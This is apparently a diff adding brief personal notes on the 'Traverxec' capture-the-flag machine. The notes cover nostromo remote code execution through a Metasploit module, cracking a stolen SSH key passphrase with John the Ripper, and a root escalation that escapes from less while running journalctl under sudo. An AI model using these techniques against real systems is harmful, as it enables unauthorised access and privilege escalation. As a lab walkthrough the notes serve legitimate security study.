@@ -1,0 +1,25 @@
+Traverxec 
+=============
+- 22: SSH
+- 80: nostromo 1.9.6
+
+- MSF exploit/multi/http/nostromo_code_exec
+- cat  /var/nostromo.conf/nhttpd.conf
+   homedirs		/home
+   homedirs_public	public_www
+- ls -al /home/david/public_www
+   => ls -al /home/david/public_www/protected-file-area
+   => cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp
+- python3 /usr/share/john/ssh2john.py id_rsa > hash.txt
+- john --wordlist=/home/root/Documents/rockyou.txt hash.txt
+- john --show hash.txt
+  => "hunter"
+- cat /home/david/user.txt
+- /home/david/bin/server-stats.sh
+   /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+   => Benutzer kann "/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service" ohne Passwort ausführen
+- GTFOBins:
+   => https://gtfobins.github.io/gtfobins/journalctl/
+   => /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service 
+       => !/bin/sh (aus less ausbrechen)
+ - cat /root/root.txt
